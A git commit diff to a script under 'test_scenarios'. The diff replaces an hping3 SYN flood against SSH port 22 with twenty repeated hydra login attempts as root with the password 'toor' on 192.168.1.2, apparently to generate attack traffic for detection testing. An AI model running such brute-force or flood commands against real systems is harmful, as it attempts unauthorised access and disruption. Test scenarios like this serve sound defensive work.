f0993d17debc5f6e1d74355d185be49b0b4ed3c5
lixt28 <148846244+lixt28@users.noreply.github.com>
2025-10-19 17:59:17 -0400

    Update ssh_bruteforce_syn.sh

--- scripts/test_scenarios/ssh_bruteforce_syn.sh
+++ scripts/test_scenarios/ssh_bruteforce_syn.sh
@@ -1,5 +1,21 @@
 #!/usr/bin/env bash
-# usage: sudo ./ssh_bruteforce_syn.sh 192.168.1.2 40
-TARGET=${1:-192.168.1.2}
-COUNT=${2:-40}
-sudo hping3 -S -p 22 -c "$COUNT" --faster "$TARGET"
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
+hydra -l root -p toor ssh://192.168.1.2
